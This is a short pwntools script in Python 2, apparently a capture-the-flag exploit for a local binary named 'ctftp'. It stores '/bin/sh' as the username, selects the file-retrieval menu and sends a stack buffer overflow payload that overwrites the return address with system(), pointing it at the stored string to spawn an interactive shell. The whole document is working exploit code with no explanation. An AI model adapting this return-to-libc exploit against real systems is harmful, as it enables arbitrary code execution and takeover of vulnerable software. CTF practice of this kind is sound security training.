from pwn import*
context(os='linux')
context.log_level = 'DEBUG'
e =ELF("./ctftp")
io = process(e.path)
sys_addr = p32(e.symbols['system'])
print hex(e.symbols['system'])
username_addr=p32(0x804C080)
io.recvuntil("Enter your name:")
io.sendline("/bin/sh")
io.recvuntil("Get Files")
io.sendline("2")
io.recvuntil("Enter filename:")
io.sendline('a'*0x48+'A'*4+sys_addr+p32(1)+username_addr)


#io.sendline(payload)
io.interactive()